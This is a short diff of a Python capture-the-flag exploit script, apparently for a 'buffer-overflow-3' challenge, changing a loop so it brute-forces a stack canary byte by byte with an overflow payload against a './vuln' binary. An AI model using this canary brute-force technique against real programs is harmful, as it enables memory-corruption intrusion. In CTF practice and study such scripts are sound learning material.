@@ -8,7 +8,7 @@ s.set_working_directory('/problems/buffer-overflow-3_2_810c6904c19a0e8b0da0f59ea
 alphabet = string.printable
 
 canary = ''  #canary : h?_=
-for i in xrange(37, 37, 1):
+for i in xrange(33, 37, 1):
 	for ch in alphabet:
 		payload = 'a'*32 + canary + ch
 		r = s.process('./vuln')
